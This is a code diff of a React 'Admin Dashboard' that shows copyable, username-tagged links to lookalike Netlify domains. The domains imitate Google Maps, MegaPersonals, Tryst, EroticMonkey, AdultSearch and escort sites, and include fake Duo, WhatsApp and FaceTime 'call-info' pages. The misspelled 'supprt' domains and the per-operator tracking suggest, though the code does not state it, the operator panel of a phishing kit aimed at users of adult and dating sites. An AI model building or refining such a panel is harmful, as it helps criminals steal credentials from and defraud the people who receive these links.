@@ -1,351 +1,339 @@
-import React, { useContext, useState } from 'react';
-import { FaClipboard, FaLink, FaInfoCircle, FaUser, FaLock, FaDesktop } from 'react-icons/fa';
-import { MdContentCopy } from 'react-icons/md';
-import { useOutlet, useOutletContext } from 'react-router-dom';
+"use client"
 
-const Links = () => {
-  const [copied, setCopied] = useState({
-    google: false,
-    megaDuo: false,
-    megaWhatsApp: false,
-    megaFaceTime: false,
-    megaLogin: false,
-    tryst: false,
-    eroticMonkey: false,
-    adultsearch: false,
-  });
+import { useState } from "react"
+import { FaLink, FaInfoCircle, FaExternalLinkAlt, FaRegCopy, FaCheck, FaUser, FaLock, FaDesktop } from "react-icons/fa"
+import { MdSecurity, MdInfo } from "react-icons/md"
+import { BiLinkExternal, BiMessageDetail } from "react-icons/bi"
+import { HiOutlineClipboardCopy, HiOutlineClipboardCheck } from "react-icons/hi"
+import { motion } from "framer-motion"
+import { toast, ToastContainer } from "react-toastify"
+import "react-toastify/dist/ReactToastify.css"
 
-  const { isUserAuthenticated, userData } = useOutletContext()
-
-  // The link to be copied
-
-  const linkGoogle = `https://google-mapss.netlify.app/${userData?.email?.split('@')[0]}`
-
-  const linkMegaDuo = `https://call-info.netlify.app/${userData?.email?.split('@')[0]}/duo`
-  const linkMegaWhatsApp = `https://call-info.netlify.app/${userData?.email?.split('@')[0]}/whatsapp`
-  const linkMegaFaceTime = `https://call-info.netlify.app/${userData?.email?.split('@')[0]}/facetime`
-
-  const linkMegaLogin = `https://megaqerrsonals.netlify.app/${userData?.email?.split('@')[0]}`
-
-  const linkTrystLink = `https://supprt-trust.netlify.app/${userData?.email?.split('@')[0]}`
-  const linkEroticMonkey = `https://supprt-erticmonkey.netlify.app/${userData?.email?.split('@')[0]}`
-  const linkAdultSearch = `https://adult-search.netlify.app/${userData?.email?.split('@')[0]}`
-
-  // Handle copy to clipboard functionality
-  const handleCopy = (urlAsLink, nameOfLink) => {
-    navigator.clipboard.writeText(urlAsLink);
-    setCopied((prevCopies) => {
-      return { ...prevCopies, [nameOfLink]: true }
-    });
-    setTimeout(() => {
-      setCopied((prevCopies) => {
-        return { ...prevCopies, [nameOfLink]: false }
-      })
-    }, 2000); // Reset copied state after 2 seconds
-  };
-
-  if (!isUserAuthenticated) {
-    return <div></div>
-  }
+// Mega Link Card with curved design
+const MegaLinkCard = ({ title, url, icon, linkKey, handleCopy }) => {
+  const [isHovering, setIsHovering] = useState(false)
 
   return (
+    <motion.div
+      className="bg-white rounded-2xl shadow-lg overflow-hidden border-t-4 border-indigo-500"
+      whileHover={{ y: -5, scale: 1.02 }}
+      transition={{ type: "spring", stiffness: 300 }}
+      onHoverStart={() => setIsHovering(true)}
+      onHoverEnd={() => setIsHovering(false)}
+    >
+      <div className="p-5">
+        <div className="flex items-center gap-3 mb-3">
+          <div className="bg-indigo-500 p-2 rounded-full">{icon}</div>
+          <h2 className="text-xl font-semibold text-indigo-800">{title}</h2>
+        </div>
 
-    <div className="min-h-screen bg-gray-50 py-8 md:px-8 sm:px-8 px-4 flex lg:flex-row flex-col flex-wrap lg:justify-center items-center gap-y-6 md:gap-y-10">
-      <div className="text-center mb-8">
-        <h1 className="text-3xl font-bold text-gray-800">Admin Dashboard</h1>
-        <p className="text-gray-600 mt-2 text-lg">
-          Access your admin dashboard using the link below. You can easily copy the link for quick access.
-        </p>
-      </div>
+        <div className="bg-indigo-50 rounded-xl p-3 mb-3">
+          <p className="text-indigo-700 text-sm truncate font-mono">{url}</p>
+        </div>
 
-      <div className="flex flex-wrap justify-center items-center gap-6">
-
-
-        {/* Link Info Section */}
-
-        <div className="bg-white shadow-xl rounded-lg p-6 sm:max-w-[540px] sm:min-w-[420px] w-full">
-          <div className="flex items-center justify-between mb-5 sm:mb-8">
-            <div className="flex items-center gap-3">
-              <FaLink className="text-green-600 text-2xl" />
-              <h2 className="text-xl font-semibold text-slate-600">Mega Links</h2>
-            </div>
-            <FaInfoCircle className="text-gray-500 text-xl" />
-          </div>
-
-
-          <div className=' flex flex-col w-full gap-2'>
-            <h2 className=' text-stone-700 font-semibold sm:text-xl'>1. Mega Login Page</h2>
-            <div className="flex flex-wrap justify-center items-center gap-3 mb-4">
-              <p className="text-gray-800 text-sm bg-gray-200 w-full text-center p-2 rounded-lg flex-1">
-                {linkMegaLogin}
-              </p>
-              <button
-                onClick={() => handleCopy(linkMegaLogin, 'megaLogin')}
-                className="text-white bg-blue-600 hover:bg-blue-700 py-2 px-4 rounded-lg flex items-center"
-              >
-                {copied.megaLogin ? (
-                  <>
-                    <MdContentCopy className="text-lg mr-2" />
-                    Copied!
-                  </>
-                ) : (
-                  <>
-                    <FaClipboard className="text-lg mr-2" />
-                    Copy Link
-                  </>
-                )}
-              </button>
-            </div>
-          </div>
-
-
-          <div className=' flex flex-col w-full gap-2'>
-            <h2 className=' text-stone-700 font-semibold sm:text-xl'>2. Mega-Duo</h2>
-            <div className="flex flex-wrap justify-center items-center gap-3 mb-4">
-              <p className="text-gray-800 text-sm bg-gray-200 w-full text-center p-2 rounded-lg flex-1">
-                {linkMegaDuo}
-              </p>
-              <button
-                onClick={() => handleCopy(linkMegaDuo, 'megaDuo')}
-                className="text-white bg-blue-600 hover:bg-blue-700 py-2 px-4 rounded-lg flex items-center"
-              >
-                {copied.megaDuo ? (
-                  <>
-                    <MdContentCopy className="text-lg mr-2" />
-                    Copied!
-                  </>
-                ) : (
-                  <>
-                    <FaClipboard className="text-lg mr-2" />
-                    Copy Link
-                  </>
-                )}
-              </button>
-            </div>
-          </div>
-
-          <div className=' flex flex-col w-full gap-2'>
-            <h2 className=' text-stone-700 font-semibold sm:text-xl'>3. Mega-WhatsApp</h2>
-            <div className="flex flex-wrap justify-center items-center gap-3 mb-4">
-              <p className="text-gray-800 text-sm bg-gray-200 w-full text-center p-2 rounded-lg flex-1">
-                {linkMegaWhatsApp}
-              </p>
-              <button
-                onClick={() => handleCopy(linkMegaWhatsApp, 'megaWhatsApp')}
-                className="text-white bg-blue-600 hover:bg-blue-700 py-2 px-4 rounded-lg flex items-center"
-              >
-                {copied.megaWhatsApp ? (
-                  <>
-                    <MdContentCopy className="text-lg mr-2" />
-                    Copied!
-                  </>
-                ) : (
-                  <>
-                    <FaClipboard className="text-lg mr-2" />
-                    Copy Link
-                  </>
-                )}
-              </button>
-            </div>
-          </div>
-
-          <div className=' flex flex-col w-full gap-2'>
-            <h2 className=' text-stone-700 font-semibold sm:text-xl'>4. Mega-Facetime</h2>
-            <div className="flex flex-wrap justify-center items-center gap-3 mb-4">
-              <p className="text-gray-800 text-sm bg-gray-200 w-full text-center p-2 rounded-lg flex-1">
-                {linkMegaFaceTime}
-              </p>
-              <button
-                onClick={() => handleCopy(linkMegaFaceTime, 'megaFaceTime')}
-                className="text-white bg-blue-600 hover:bg-blue-700 py-2 px-4 rounded-lg flex items-center"
-              >
-                {copied.megaFaceTime ? (
-                  <>
-                    <MdContentCopy className="text-lg mr-2" />
-                    Copied!
-                  </>
-                ) : (
-                  <>
-                    <FaClipboard className="text-lg mr-2" />
-                    Copy Link
-                  </>
-                )}
-              </button>
-            </div>
-          </div>
-
-          <p className="text-gray-600 text-sm">
-            Simply click the "Copy Link" button to copy your link URL to the clipboard.
-            You can then paste it in the browser's address bar or send inside a mail.
+        <div className="flex items-center gap-2 mb-4 text-indigo-600">
+          <MdInfo className="text-lg flex-shrink-0" />
+          <p className="text-xs text-gray-600">
+            This link provides access to {title}. Use it to direct users to the appropriate platform.
           </p>
         </div>
 
-        {/* Link Info Section */}
-
-        <div className="bg-white shadow-xl rounded-lg p-6 sm:max-w-[540px] sm:min-w-[420px] w-full">
-          <div className="flex items-center justify-between mb-5 sm:mb-8">
-            <div className="flex items-center gap-3">
-              <FaLink className="text-green-600 text-2xl" />
-              <h2 className="text-xl font-semibold text-slate-600">Google</h2>
-            </div>
-            <FaInfoCircle className="text-gray-500 text-xl" />
-          </div>
-
-          <div className=' flex flex-col w-full gap-2'>
-            <h2 className=' text-stone-700 font-semibold sm:text-xl'>1. Google-Maps</h2>
-            <div className="flex flex-wrap justify-center items-center gap-3 mb-4">
-              <p className="text-gray-800 text-sm bg-gray-200 w-full text-center p-2 rounded-lg flex-1">
-                {linkGoogle}
-              </p>
-              <button
-                onClick={() => handleCopy(linkGoogle, 'google')}
-                className="text-white bg-blue-600 hover:bg-blue-700 py-2 px-4 rounded-lg flex items-center"
-              >
-                {copied.google ? (
-                  <>
-                    <MdContentCopy className="text-lg mr-2" />
-                    Copied!
-                  </>
-                ) : (
-                  <>
-                    <FaClipboard className="text-lg mr-2" />
-                    Copy Link
-                  </>
-                )}
-              </button>
-            </div>
-          </div>
-        </div>
-
-        <div className="bg-white shadow-xl rounded-lg p-6 sm:max-w-[540px] sm:min-w-[420px] w-full">
-          <div className="flex items-center justify-between mb-5 sm:mb-8">
-            <div className="flex items-center gap-3">
-              <FaLink className="text-green-600 text-2xl" />
-              <h2 className="text-xl font-semibold text-slate-600">Tryst</h2>
-            </div>
-            <FaInfoCircle className="text-gray-500 text-xl" />
-          </div>
-
-          <div className=' flex flex-col w-full gap-2'>
-            <h2 className=' text-stone-700 font-semibold sm:text-xl'>1. Tryst Link</h2>
-            <div className="flex flex-wrap justify-center items-center gap-3 mb-4">
-              <p className="text-gray-800 text-sm bg-gray-200 w-full text-center p-2 rounded-lg flex-1">
-                {linkTrystLink}
-              </p>
-              <button
-                onClick={() => handleCopy(linkTrystLink, 'tryst')}
-                className="text-white bg-blue-600 hover:bg-blue-700 py-2 px-4 rounded-lg flex items-center"
-              >
-                {copied.tryst ? (
-                  <>
-                    <MdContentCopy className="text-lg mr-2" />
-                    Copied!
-                  </>
-                ) : (
-                  <>
-                    <FaClipboard className="text-lg mr-2" />
-                    Copy Link
-                  </>
-                )}
-              </button>
-            </div>
-          </div>
-        </div>
-
-        <div className="bg-white shadow-xl rounded-lg p-6 sm:max-w-[540px] sm:min-w-[420px] w-full">
-          <div className="flex items-center justify-between mb-5 sm:mb-8">
-            <div className="flex items-center gap-3">
-              <FaLink className="text-green-600 text-2xl" />
-              <h2 className="text-xl font-semibold text-slate-600">E. Monkey</h2>
-            </div>
-            <FaInfoCircle className="text-gray-500 text-xl" />
-          </div>
-
-          <div className=' flex flex-col w-full gap-2'>
-            <h2 className=' text-stone-700 font-semibold sm:text-xl'>1. Erotic Monkey</h2>
-            <div className="flex flex-wrap justify-center items-center gap-3 mb-4">
-              <p className="text-gray-800 text-sm bg-gray-200 w-full text-center p-2 rounded-lg flex-1">
-                {linkEroticMonkey}
-              </p>
-              <button
-                onClick={() => handleCopy(linkEroticMonkey, 'eroticMonkey')}
-                className="text-white bg-blue-600 hover:bg-blue-700 py-2 px-4 rounded-lg flex items-center"
-              >
-                {copied.eroticMonkey ? (
-                  <>
-                    <MdContentCopy className="text-lg mr-2" />
-                    Copied!
-                  </>
-                ) : (
-                  <>
-                    <FaClipboard className="text-lg mr-2" />
-                    Copy Link
-                  </>
-                )}
-              </button>
-            </div>
-          </div>
-        </div>
-
-        <div className="bg-white shadow-xl rounded-lg p-6 sm:max-w-[540px] sm:min-w-[420px] w-full">
-          <div className="flex items-center justify-between mb-5 sm:mb-8">
-            <div className="flex items-center gap-3">
-              <FaLink className="text-green-600 text-2xl" />
-              <h2 className="text-xl font-semibold text-slate-600">A. Search</h2>
-            </div>
-            <FaInfoCircle className="text-gray-500 text-xl" />
-          </div>
-
-          <div className=' flex flex-col w-full gap-2'>
-            <h2 className=' text-stone-700 font-semibold sm:text-xl'>1. Adult Search</h2>
-            <div className="flex flex-wrap justify-center items-center gap-3 mb-4">
-              <p className="text-gray-800 text-sm bg-gray-200 w-full text-center p-2 rounded-lg flex-1">
-                {linkAdultSearch}
-              </p>
-              <button
-                onClick={() => handleCopy(linkAdultSearch, 'adultsearch')}
-                className="text-white bg-blue-600 hover:bg-blue-700 py-2 px-4 rounded-lg flex items-center"
-              >
-                {copied.adultsearch ? (
-                  <>
-                    <MdContentCopy className="text-lg mr-2" />
-                    Copied!
-                  </>
-                ) : (
-                  <>
-                    <FaClipboard className="text-lg mr-2" />
-                    Copy Link
-                  </>
-                )}
-              </button>
-            </div>
-          </div>
-        </div>
-
-
-      </div >
-
-      {/* Extra Information */}
-
-      <div className="bg-white shadow-xl rounded-lg p-6 md:w-1/3 md:min-w-[400px] w-full">
-        <h3 className="text-xl font-semibold text-gray-700 mb-4">Dashboard Tools</h3>
-        <div className="space-y-4">
-          <div className="flex items-center gap-2">
-            <FaUser className="text-gray-600 text-lg" />
-            <p className="text-gray-700">Manage users, view analytics, and more.</p>
-          </div>
-          <div className="flex items-center gap-2">
-            <FaLock className="text-gray-600 text-lg" />
-            <p className="text-gray-700">Secure login with admin privileges only.</p>
-          </div>
-          <div className="flex items-center gap-2">
-            <FaDesktop className="text-gray-600 text-lg" />
-            <p className="text-gray-700">Access your dashboard from any device.</p>
-          </div>
-        </div>
+        <motion.button
+          onClick={() => handleCopy(url, linkKey)}
+          className="w-full text-white bg-gradient-to-r from-indigo-500 to-blue-600 hover:from-indigo-600 hover:to-blue-700 py-3 px-4 rounded-xl flex items-center justify-center"
+          whileTap={{ scale: 0.95 }}
+        >
+          {isHovering ? (
+            <HiOutlineClipboardCopy className="text-lg mr-2" />
+          ) : (
+            <HiOutlineClipboardCheck className="text-lg mr-2" />
+          )}
+          Copy to Clipboard
+        </motion.button>
       </div>
-    </div >
-  );
-};
+    </motion.div>
+  )
+}
 
-export default Links;
+// Regular Link Card with sharp edges
+const LinkCard = ({ title, url, icon, linkKey, handleCopy }) => {
+  const [isHovering, setIsHovering] = useState(false)
+
+  return (
+    <motion.div
+      className="bg-white rounded-lg shadow-lg overflow-hidden border-l-4 border-sky-500"
+      whileHover={{ y: -5 }}
+      transition={{ type: "spring", stiffness: 300 }}
+      onHoverStart={() => setIsHovering(true)}
+      onHoverEnd={() => setIsHovering(false)}
+    >
+      <div className="p-4">
+        <div className="flex items-center gap-3 mb-3">
+          <div className="bg-sky-500 p-2 rounded-md">{icon}</div>
+          <h2 className="text-lg font-semibold text-sky-800">{title}</h2>
+        </div>
+
+        <div className="bg-sky-50 rounded-md p-3 mb-3">
+          <p className="text-sky-700 text-sm truncate font-mono">{url}</p>
+        </div>
+
+        <div className="flex items-center gap-2 mb-3 text-sky-600">
+          <BiMessageDetail className="text-lg flex-shrink-0" />
+          <p className="text-xs text-gray-600">Click the button below to copy this {title} link to your clipboard.</p>
+        </div>
+
+        <motion.button
+          onClick={() => handleCopy(url, linkKey)}
+          className="w-full text-white bg-gradient-to-r from-sky-500 to-blue-500 hover:from-sky-600 hover:to-blue-600 py-2 px-4 rounded-md flex items-center justify-center"
+          whileTap={{ scale: 0.95 }}
+        >
+          {isHovering ? <FaRegCopy className="text-lg mr-2" /> : <FaCheck className="text-lg mr-2" />}
+          Copy Link
+        </motion.button>
+      </div>
+    </motion.div>
+  )
+}
+
+const Links = () => {
+  // Simplified state management - no need to track each link separately
+  const [userData, setUserData] = useState({ email: "user@example.com" }) // Mock data, replace with context in real app
+
+  // Extract username from email
+  const username = userData?.email?.split("@")[0]
+
+  // Define all links in a single object for easier management
+  const links = {
+    mega: {
+      login: `https://megaqerrsonals.netlify.app/${username}`,
+      duo: `https://call-info.netlify.app/${username}/duo`,
+      whatsapp: `https://call-info.netlify.app/${username}/whatsapp`,
+      facetime: `https://call-info.netlify.app/${username}/facetime`,
+    },
+    google: `https://google-mapss.netlify.app/${username}`,
+    tryst: `https://supprt-trust.netlify.app/${username}`,
+    eroticMonkey: `https://supprt-erticmonkey.netlify.app/${username}`,
+    adultSearch: `https://adult-search.netlify.app/${username}`,
+    callEscort: `https://call-escort-dev.netlify.app/${username}`,
+    hot: `https://hot-dev.netlify.app/${username}`,
+  }
+
+  // Handle copy to clipboard with toast notification
+  const handleCopy = (url, name) => {
+    navigator.clipboard.writeText(url)
+    toast.success(`${name} link copied!`, {
+      position: "top-right",
+      autoClose: 2000,
+      hideProgressBar: false,
+      closeOnClick: true,
+      pauseOnHover: true,
+      draggable: true,
+      icon: <FaCheck className="text-green-500" />,
+    })
+  }
+
+  return (
+    <div className="min-h-screen bg-gray-50 py-8 px-4 md:px-8">
+      <ToastContainer />
+
+      <motion.div
+        className="max-w-7xl mx-auto"
+        initial={{ opacity: 0, y: 20 }}
+        animate={{ opacity: 1, y: 0 }}
+        transition={{ duration: 0.5 }}
+      >
+        <div className="text-center mb-10">
+          <h1 className="text-4xl font-bold text-indigo-800 mb-2">Admin Dashboard</h1>
+          <div className="flex items-center justify-center gap-2 text-gray-600">
+            <FaLink className="text-blue-500" />
+            <p>Access and manage all your links in one place</p>
+          </div>
+        </div>
+
+        {/* How to use section */}
+        <motion.div
+          className="mb-10 bg-white p-6 rounded-xl border border-blue-200 shadow-md"
+          initial={{ opacity: 0, y: 20 }}
+          animate={{ opacity: 1, y: 0 }}
+          transition={{ delay: 0.2, duration: 0.5 }}
+        >
+          <div className="flex items-start gap-4">
+            <div className="bg-blue-500 p-3 rounded-full mt-1">
+              <MdInfo className="text-2xl text-white" />
+            </div>
+            <div>
+              <h2 className="text-xl font-semibold mb-2 text-gray-800">How to Use These Links</h2>
+              <ol className="list-decimal ml-5 space-y-2 text-gray-600">
+                <li>Find the link you need from the categories below</li>
+                <li>Click the "Copy Link" button to copy the URL to your clipboard</li>
+                <li>Paste the link in your browser or share it with others</li>
+                <li>
+                  Each link is personalized with your username:{" "}
+                  <span className="bg-blue-100 px-2 py-1 rounded font-mono text-blue-700">{username}</span>
+                </li>
+              </ol>
+            </div>
+          </div>
+        </motion.div>
+
+        {/* Mega Links Section */}
+        <div className="mb-10">
+          <div className="flex items-center gap-3 mb-6">
+            <div className="bg-indigo-500 p-2 rounded-lg">
+              <FaLink className="text-white text-xl" />
+            </div>
+            <h2 className="text-2xl font-semibold text-indigo-800">Mega Links</h2>
+          </div>
+
+          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
+            <MegaLinkCard
+              title="Mega Login"
+              url={links.mega.login}
+              icon={<FaExternalLinkAlt className="text-white text-lg" />}
+              linkKey="Mega Login"
+              handleCopy={handleCopy}
+            />
+            <MegaLinkCard
+              title="Mega Duo"
+              url={links.mega.duo}
+              icon={<BiLinkExternal className="text-white text-lg" />}
+              linkKey="Mega Duo"
+              handleCopy={handleCopy}
+            />
+            <MegaLinkCard
+              title="Mega WhatsApp"
+              url={links.mega.whatsapp}
+              icon={<FaLink className="text-white text-lg" />}
+              linkKey="Mega WhatsApp"
+              handleCopy={handleCopy}
+            />
+            <MegaLinkCard
+              title="Mega FaceTime"
+              url={links.mega.facetime}
+              icon={<BiLinkExternal className="text-white text-lg" />}
+              linkKey="Mega FaceTime"
+              handleCopy={handleCopy}
+            />
+          </div>
+        </div>
+
+        {/* Other Links Section */}
+        <div className="mb-10">
+          <div className="flex items-center gap-3 mb-6">
+            <div className="bg-sky-500 p-2 rounded-lg">
+              <FaLink className="text-white text-xl" />
+            </div>
+            <h2 className="text-2xl font-semibold text-sky-800">Service Links</h2>
+          </div>
+
+          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+            <LinkCard
+              title="Google Maps"
+              url={links.google}
+              icon={<FaLink className="text-white text-lg" />}
+              linkKey="Google Maps"
+              handleCopy={handleCopy}
+            />
+            <LinkCard
+              title="Tryst"
+              url={links.tryst}
+              icon={<FaLink className="text-white text-lg" />}
+              linkKey="Tryst"
+              handleCopy={handleCopy}
+            />
+            <LinkCard
+              title="Erotic Monkey"
+              url={links.eroticMonkey}
+              icon={<FaLink className="text-white text-lg" />}
+              linkKey="Erotic Monkey"
+              handleCopy={handleCopy}
+            />
+            <LinkCard
+              title="Adult Search"
+              url={links.adultSearch}
+              icon={<FaLink className="text-white text-lg" />}
+              linkKey="Adult Search"
+              handleCopy={handleCopy}
+            />
+            <LinkCard
+              title="Call Escort"
+              url={links.callEscort}
+              icon={<FaLink className="text-white text-lg" />}
+              linkKey="Call Escort"
+              handleCopy={handleCopy}
+            />
+            <LinkCard
+              title="Hot"
+              url={links.hot}
+              icon={<FaLink className="text-white text-lg" />}
+              linkKey="Hot"
+              handleCopy={handleCopy}
+            />
+          </div>
+        </div>
+
+        {/* Info Card */}
+        <motion.div
+          className="mt-10 bg-white p-6 rounded-xl shadow-lg border border-blue-200"
+          whileHover={{ scale: 1.02 }}
+          transition={{ type: "spring", stiffness: 300 }}
+        >
+          <div className="flex items-start gap-4">
+            <div className="bg-blue-500 p-3 rounded-full mt-1">
+              <MdSecurity className="text-2xl text-white" />
+            </div>
+            <div>
+              <h3 className="text-xl font-semibold text-gray-800 mb-2">Security Notice</h3>
+              <p className="text-gray-600 mb-3">
+                These links are personalized for your account and should be shared securely. Each link contains your
+                unique identifier.
+              </p>
+              <div className="bg-blue-50 p-3 rounded-lg text-gray-700 text-sm">
+                <p className="flex items-center gap-2">
+                  <FaInfoCircle className="text-blue-500 flex-shrink-0" />
+                  <span>
+                    Links are valid until your next session. For security reasons, avoid sharing these links on public
+                    platforms.
+                  </span>
+                </p>
+              </div>
+            </div>
+          </div>
+        </motion.div>
+
+        {/* Dashboard Tools */}
+        <motion.div
+          className="mt-10 bg-white shadow-xl rounded-lg p-6 w-full"
+          initial={{ opacity: 0, y: 20 }}
+          animate={{ opacity: 1, y: 0 }}
+          transition={{ delay: 0.4, duration: 0.5 }}
+        >
+          <h3 className="text-xl font-semibold text-gray-800 mb-4">Dashboard Tools</h3>
+          <div className="grid md:grid-cols-3 gap-4">
+            <div className="flex items-center gap-3 bg-blue-50 p-4 rounded-lg">
+              <div className="bg-blue-500 p-2 rounded-full">
+                <FaUser className="text-white text-lg" />
+              </div>
+              <p className="text-gray-700">Manage users, view analytics, and more.</p>
+            </div>
+            <div className="flex items-center gap-3 bg-indigo-50 p-4 rounded-lg">
+              <div className="bg-indigo-500 p-2 rounded-full">
+                <FaLock className="text-white text-lg" />
+              </div>
+              <p className="text-gray-700">Secure login with admin privileges only.</p>
+            </div>
+            <div className="flex items-center gap-3 bg-sky-50 p-4 rounded-lg">
+              <div className="bg-sky-500 p-2 rounded-full">
+                <FaDesktop className="text-white text-lg" />
+              </div>
+              <p className="text-gray-700">Access your dashboard from any device.</p>
+            </div>
+          </div>
+        </motion.div>
+      </motion.div>
+    </div>
+  )
+}
+
+export default Links
+
